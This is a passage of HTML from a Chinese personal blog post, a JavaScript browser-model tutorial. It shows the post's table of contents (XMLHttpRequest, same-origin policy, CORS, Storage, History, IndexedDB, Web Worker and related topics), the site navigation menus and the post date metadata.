class="toc-text">XMLHttpRequest.getAllResponseHeaders()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLHttpRequest-abort"><span class="toc-number">5.3.7.</span> <span class="toc-text">XMLHttpRequest.abort()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLHttpRequest-实例的事件"><span class="toc-number">5.4.</span> <span class="toc-text">XMLHttpRequest 实例的事件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#readyStateChange-事件"><span class="toc-number">5.4.1.</span> <span class="toc-text">readyStateChange 事件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#progress-事件"><span class="toc-number">5.4.2.</span> <span class="toc-text">progress 事件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#load-事件、error-事件、abort-事件"><span class="toc-number">5.4.3.</span> <span class="toc-text">load 事件、error 事件、abort 事件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#loadend-事件"><span class="toc-number">5.4.4.</span> <span class="toc-text">loadend 事件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#timeout-事件"><span class="toc-number">5.4.5.</span> <span class="toc-text">timeout 事件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Navigator-sendBeacon-1"><span class="toc-number">5.5.</span> <span class="toc-text">Navigator.sendBeacon()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#同源限制"><span class="toc-number">6.</span> <span class="toc-text">同源限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述-2"><span class="toc-number">6.1.</span> <span class="toc-text">概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#含义"><span class="toc-number">6.1.1.</span> <span class="toc-text">含义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#目的"><span class="toc-number">6.1.2.</span> <span class="toc-text">目的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#限制范围"><span class="toc-number">6.1.3.</span> <span class="toc-text">限制范围</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-1"><span class="toc-number">6.2.</span> <span class="toc-text">Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iframe-和多窗口通信"><span class="toc-number">6.3.</span> <span class="toc-text">iframe 和多窗口通信</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#片段识别符"><span class="toc-number">6.3.1.</span> <span class="toc-text">片段识别符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#window-postMessage"><span class="toc-number">6.3.2.</span> <span class="toc-text">window.postMessage()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LocalStorage"><span class="toc-number">6.3.3.</span> <span class="toc-text">LocalStorage</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AJAX"><span class="toc-number">6.4.</span> <span class="toc-text">AJAX</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JSONP"><span class="toc-number">6.4.1.</span> <span class="toc-text">JSONP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebSocket"><span class="toc-number">6.4.2.</span> <span class="toc-text">WebSocket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CORS"><span class="toc-number">6.4.3.</span> <span class="toc-text">CORS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS-通信"><span class="toc-number">7.</span> <span class="toc-text">CORS 通信</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介-1"><span class="toc-number">7.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#两种请求"><span class="toc-number">7.2.</span> <span class="toc-text">两种请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单请求"><span class="toc-number">7.3.</span> <span class="toc-text">简单请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#基本流程"><span class="toc-number">7.3.1.</span> <span class="toc-text">基本流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#withCredentials-属性"><span class="toc-number">7.3.2.</span> <span class="toc-text">withCredentials 属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非简单请求"><span class="toc-number">7.4.</span> <span class="toc-text">非简单请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#预检请求"><span class="toc-number">7.4.1.</span> <span class="toc-text">预检请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#预检请求的回应"><span class="toc-number">7.4.2.</span> <span class="toc-text">预检请求的回应</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#浏览器的正常请求和回应"><span class="toc-number">7.4.3.</span> <span class="toc-text">浏览器的正常请求和回应</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与-JSONP-的比较"><span class="toc-number">7.5.</span> <span class="toc-text">与 JSONP 的比较</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Storage-接口"><span class="toc-number">8.</span> <span class="toc-text">Storage 接口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述-3"><span class="toc-number">8.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#属性和方法"><span class="toc-number">8.2.</span> <span class="toc-text">属性和方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Storage-setItem"><span class="toc-number">8.2.1.</span> <span class="toc-text">Storage.setItem()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Storage-getItem"><span class="toc-number">8.2.2.</span> <span class="toc-text">Storage.getItem()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Storage-removeItem"><span class="toc-number">8.2.3.</span> <span class="toc-text">Storage.removeItem()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Storage-clear"><span class="toc-number">8.2.4.</span> <span class="toc-text">Storage.clear()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Storage-key"><span class="toc-number">8.2.5.</span> <span class="toc-text">Storage.key()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#storage-事件"><span class="toc-number">8.3.</span> <span class="toc-text">storage 事件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#History-对象"><span class="toc-number">9.</span> <span class="toc-text">History 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述-4"><span class="toc-number">9.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#属性"><span class="toc-number">9.2.</span> <span class="toc-text">属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法"><span class="toc-number">9.3.</span> <span class="toc-text">方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#History-back-、History-forward-、History-go"><span class="toc-number">9.3.1.</span> <span class="toc-text">History.back()、History.forward()、History.go()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#History-pushState"><span class="toc-number">9.3.2.</span> <span class="toc-text">History.pushState()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#History-replaceState"><span class="toc-number">9.3.3.</span> <span class="toc-text">History.replaceState()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#popstate-事件"><span class="toc-number">9.4.</span> <span class="toc-text">popstate 事件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Location-对象，URL-对象，URLSearchParams-对象"><span class="toc-number">10.</span> <span class="toc-text">Location 对象，URL 对象，URLSearchParams 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Location-对象"><span class="toc-number">10.1.</span> <span class="toc-text">Location 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#属性-1"><span class="toc-number">10.1.1.</span> <span class="toc-text">属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法-1"><span class="toc-number">10.1.2.</span> <span class="toc-text">方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-的编码和解码"><span class="toc-number">10.2.</span> <span class="toc-text">URL 的编码和解码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#encodeURI"><span class="toc-number">10.2.1.</span> <span class="toc-text">encodeURI()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#encodeURIComponent"><span class="toc-number">10.2.2.</span> <span class="toc-text">encodeURIComponent()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#decodeURI"><span class="toc-number">10.2.3.</span> <span class="toc-text">decodeURI()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#decodeURIComponent"><span class="toc-number">10.2.4.</span> <span class="toc-text">decodeURIComponent()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-接口"><span class="toc-number">10.3.</span> <span class="toc-text">URL 接口</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#构造函数"><span class="toc-number">10.3.1.</span> <span class="toc-text">构造函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实例属性"><span class="toc-number">10.3.2.</span> <span class="toc-text">实例属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#静态方法"><span class="toc-number">10.3.3.</span> <span class="toc-text">静态方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLSearchParams-对象"><span class="toc-number">10.4.</span> <span class="toc-text">URLSearchParams 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#概述-5"><span class="toc-number">10.4.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-toString"><span class="toc-number">10.4.2.</span> <span class="toc-text">URLSearchParams.toString()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-append"><span class="toc-number">10.4.3.</span> <span class="toc-text">URLSearchParams.append()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-delete"><span class="toc-number">10.4.4.</span> <span class="toc-text">URLSearchParams.delete()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-has"><span class="toc-number">10.4.5.</span> <span class="toc-text">URLSearchParams.has()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-set"><span class="toc-number">10.4.6.</span> <span class="toc-text">URLSearchParams.set()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-get-，URLSearchParams-getAll"><span class="toc-number">10.4.7.</span> <span class="toc-text">URLSearchParams.get()，URLSearchParams.getAll()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-sort"><span class="toc-number">10.4.8.</span> <span class="toc-text">URLSearchParams.sort()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLSearchParams-keys-，URLSearchParams-values-，URLSearchParams-entries"><span class="toc-number">10.4.9.</span> <span class="toc-text">URLSearchParams.keys()，URLSearchParams.values()，URLSearchParams.entries()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ArrayBuffer-对象，Blob-对象"><span class="toc-number">11.</span> <span class="toc-text">ArrayBuffer 对象，Blob 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ArrayBuffer-对象"><span class="toc-number">11.1.</span> <span class="toc-text">ArrayBuffer 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blob-对象"><span class="toc-number">11.2.</span> <span class="toc-text">Blob 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#简介-2"><span class="toc-number">11.2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实例属性和实例方法"><span class="toc-number">11.2.2.</span> <span class="toc-text">实例属性和实例方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取文件信息"><span class="toc-number">11.2.3.</span> <span class="toc-text">获取文件信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#下载文件"><span class="toc-number">11.2.4.</span> <span class="toc-text">下载文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#生成-URL"><span class="toc-number">11.2.5.</span> <span class="toc-text">生成 URL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#读取文件"><span class="toc-number">11.2.6.</span> <span class="toc-text">读取文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-对象，FileList-对象，FileReader-对象"><span class="toc-number">12.</span> <span class="toc-text">File 对象，FileList 对象，FileReader 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#File-对象"><span class="toc-number">12.1.</span> <span class="toc-text">File 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#构造函数-1"><span class="toc-number">12.1.1.</span> <span class="toc-text">构造函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实例属性和实例方法-1"><span class="toc-number">12.1.2.</span> <span class="toc-text">实例属性和实例方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FileList-对象"><span class="toc-number">12.2.</span> <span class="toc-text">FileList 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FileReader-对象"><span class="toc-number">12.3.</span> <span class="toc-text">FileReader 对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#表单，FormData-对象"><span class="toc-number">13.</span> <span class="toc-text">表单，FormData 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#表单概述"><span class="toc-number">13.1.</span> <span class="toc-text">表单概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FormData-对象"><span class="toc-number">13.2.</span> <span class="toc-text">FormData 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#概述-6"><span class="toc-number">13.2.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实例方法"><span class="toc-number">13.2.2.</span> <span class="toc-text">实例方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#表单的内置验证"><span class="toc-number">13.3.</span> <span class="toc-text">表单的内置验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#自动校验"><span class="toc-number">13.3.1.</span> <span class="toc-text">自动校验</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#checkValidity"><span class="toc-number">13.3.2.</span> <span class="toc-text">checkValidity()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#willValidate-属性"><span class="toc-number">13.3.3.</span> <span class="toc-text">willValidate 属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#validationMessage-属性"><span class="toc-number">13.3.4.</span> <span class="toc-text">validationMessage 属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setCustomValidity"><span class="toc-number">13.3.5.</span> <span class="toc-text">setCustomValidity()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#validity-属性"><span class="toc-number">13.3.6.</span> <span class="toc-text">validity 属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#表单的-novalidate-属性"><span class="toc-number">13.3.7.</span> <span class="toc-text">表单的 novalidate 属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#enctype-属性"><span class="toc-number">13.4.</span> <span class="toc-text">enctype 属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传"><span class="toc-number">13.5.</span> <span class="toc-text">文件上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IndexedDB-API"><span class="toc-number">14.</span> <span class="toc-text">IndexedDB API</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述-7"><span class="toc-number">14.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本概念"><span class="toc-number">14.2.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#操作流程"><span class="toc-number">14.3.</span> <span class="toc-text">操作流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#打开数据库"><span class="toc-number">14.3.1.</span> <span class="toc-text">打开数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#新建数据库"><span class="toc-number">14.3.2.</span> <span class="toc-text">新建数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#新增数据"><span class="toc-number">14.3.3.</span> <span class="toc-text">新增数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#读取数据"><span class="toc-number">14.3.4.</span> <span class="toc-text">读取数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#遍历数据"><span class="toc-number">14.3.5.</span> <span class="toc-text">遍历数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#更新数据"><span class="toc-number">14.3.6.</span> <span class="toc-text">更新数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#删除数据"><span class="toc-number">14.3.7.</span> <span class="toc-text">删除数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用索引"><span class="toc-number">14.3.8.</span> <span class="toc-text">使用索引</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#indexedDB-对象"><span class="toc-number">14.4.</span> <span class="toc-text">indexedDB 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#indexedDB-open"><span class="toc-number">14.4.1.</span> <span class="toc-text">indexedDB.open()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#indexedDB-deleteDatabase"><span class="toc-number">14.4.2.</span> <span class="toc-text">indexedDB.deleteDatabase()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#indexedDB-cmp"><span class="toc-number">14.4.3.</span> <span class="toc-text">indexedDB.cmp()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBRequest-对象"><span class="toc-number">14.5.</span> <span class="toc-text">IDBRequest 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBDatabase-对象"><span class="toc-number">14.6.</span> <span class="toc-text">IDBDatabase 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#属性-2"><span class="toc-number">14.6.1.</span> <span class="toc-text">属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法-2"><span class="toc-number">14.6.2.</span> <span class="toc-text">方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBObjectStore-对象"><span class="toc-number">14.7.</span> <span class="toc-text">IDBObjectStore 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#属性-3"><span class="toc-number">14.7.1.</span> <span class="toc-text">属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法-3"><span class="toc-number">14.7.2.</span> <span class="toc-text">方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBTransaction-对象"><span class="toc-number">14.8.</span> <span class="toc-text">IDBTransaction 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBIndex-对象"><span class="toc-number">14.9.</span> <span class="toc-text">IDBIndex 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBCursor-对象"><span class="toc-number">14.10.</span> <span class="toc-text">IDBCursor 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDBKeyRange-对象"><span class="toc-number">14.11.</span> <span class="toc-text">IDBKeyRange 对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Worker"><span class="toc-number">15.</span> <span class="toc-text">Web Worker</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述-8"><span class="toc-number">15.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本用法"><span class="toc-number">15.2.</span> <span class="toc-text">基本用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#主线程"><span class="toc-number">15.2.1.</span> <span class="toc-text">主线程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Worker-线程"><span class="toc-number">15.2.2.</span> <span class="toc-text">Worker 线程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Worker-加载脚本"><span class="toc-number">15.2.3.</span> <span class="toc-text">Worker 加载脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#错误处理"><span class="toc-number">15.2.4.</span> <span class="toc-text">错误处理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#关闭-Worker"><span class="toc-number">15.2.5.</span> <span class="toc-text">关闭 Worker</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据通信"><span class="toc-number">15.3.</span> <span class="toc-text">数据通信</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#同页面的-Web-Worker"><span class="toc-number">15.4.</span> <span class="toc-text">同页面的 Web Worker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例：Worker-线程完成轮询"><span class="toc-number">15.5.</span> <span class="toc-text">实例：Worker 线程完成轮询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例：-Worker-新建-Worker"><span class="toc-number">15.6.</span> <span class="toc-text">实例： Worker 新建 Worker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API"><span class="toc-number">15.7.</span> <span class="toc-text">API</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#主线程-1"><span class="toc-number">15.7.1.</span> <span class="toc-text">主线程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Worker-线程-1"><span class="toc-number">15.7.2.</span> <span class="toc-text">Worker 线程</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&amp;fm=26&amp;gp=0.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">向阳榆木</a></span><span class="pull_right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/random/"><i class="fa-fw fa fa-random"></i><span> 随机文章</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-th-large" aria-hidden="true"></i><span> 归档</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/tagsnet/"><i class="fa-fw fa fa-connectdevelop"></i><span> 关系网</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-send-o" aria-hidden="true"></i><span> 导航栏</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://xyyum.icu/mypages/OnlyI.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-send"></i><span> 主页导航</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/xkzhdh/Integrated.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-paper-plane-o"></i><span> 综合导航</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/software/index.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-send"></i><span> 软件分享</span></a></li><li><a class="site-page" href="/sunshineBookshelf/"><i class="fa-fw fa fa-university"></i><span> 向阳书架</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 列表</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> 书籍</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li><li><a class="site-page" href="/games/"><i class="fa-fw fa fa-gamepad"></i><span> 游戏</span></a></li><li><a class="site-page" href="/bilibili/"><i class="fa-fw fa fa-play-circle"></i><span> 番剧</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movie/"><i class="fa-fw fa fa-play-circle-o"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-link" aria-hidden="true"></i><span> 友情链接</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page" href="https://yumuxy.gitee.io/" target="_blank" rel="noopener"><i class="fa-fw fa fa-link"></i><span> 桑榆未晚</span></a></li><li><a class="site-page" href="https://lllzxqq.gitee.io/" target="_blank" rel="noopener"><i class="fa-fw fa fa-link"></i><span> 偏偏💖雨季</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-user-circle-o" aria-hidden="true"></i><span> 关于我</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="http://www.xbmu.edu.cn/" target="_blank" rel="noopener"><i class="fa-fw fa fa-graduation-cap"></i><span> 母校</span></a></li><li><a class="site-page" href="/workshop/"><i class="fa-fw fa fa-heartbeat"></i><span> 作品</span></a></li><li><a class="site-page" href="/mybook/"><i class="fa-fw fa fa-book"></i><span> 自传</span></a></li><li><a class="site-page" href="/anires/"><i class="fa-fw fa fa-list-alt"></i><span> 简历</span></a></li><li><a class="site-page" href="/vcard/"><i class="fa-fw fa fa-vcard-o"></i><span> 名片</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gamepad" aria-hidden="true"></i><span> 娱乐</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://playground.z.wiki/typing-game/index.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-gamepad"></i><span> 打字游戏</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/GreedySnake/GreedySnake.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-lastfm"></i><span> 贪吃蛇</span></a></li><li><a class="site-page" href="https://xyyum.icu/mypages/nineGridGame/nineGridGame.html" target="_blank" rel="noopener"><i class="fa-fw fa fa-gamepad"></i><span> 抽奖游戏</span></a></li><li><a class="site-page" href="/petalage/"><i class="fa-fw fa fa-gamepad"></i><span> 表白时刻</span></a></li><li><a class="site-page" href="/yszq/"><i class="fa-fw fa fa-gamepad"></i><span> 3D元素</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gear (alias)" aria-hidden="true"></i><span> 工具平台</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/xkdm/"><i class="fa-fw fa fa-star"></i><span> 星空弹幕</span></a></li><li><a class="site-page" href="https://xyym.avosapps.us/" target="_blank" rel="noopener"><i class="fa-fw fa fa-commenting-o"></i><span> 评论管理</span></a></li><li><a class="site-page" href="https://myhkw.cn/admin/user/login/" target="_blank" rel="noopener"><i class="fa-fw fa fa-music"></i><span> 音乐后台</span></a></li><li><a class="site-page" href="https://www.superbed.cn/" target="_blank" rel="noopener"><i class="fa-fw fa fa-area-chart"></i><span> 聚合图床</span></a></li><li><a class="site-page" href="/encryptedPages/"><i class="fa-fw fa fa-lock"></i><span> 加密访问</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-heartbeat" aria-hidden="true"></i><span> 纪念空间</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/3d-gallery/"><i class="fa-fw fa fa-university"></i><span> 3D相册屋</span></a></li><li><a class="site-page" href="/live-photo/"><i class="fa-fw fa fa-photo"></i><span> 青春校园</span></a></li><li><a class="site-page" href="/photo-wall/"><i class="fa-fw fa fa-th"></i><span> 生活照片</span></a></li><li><a class="site-page" href="/video-wall/"><i class="fa-fw fa fa-video-camera"></i><span> 在线视频</span></a></li><li><a class="site-page" href="/mtxx/"><i class="fa-fw fa fa-file-photo-o"></i><span> 美图秀秀</span></a></li><li><a class="site-page" href="/timeStoryline/"><i class="fa-fw fa fa-file-video-o"></i><span> 时间故事线</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">⑦JavaScript教程之浏览器模型</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2021-10-17 21:15:00"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2021-10-17</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2024-12-21 18:14:09"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2024-12-21</span></time><span class="post-meta__categories"><span 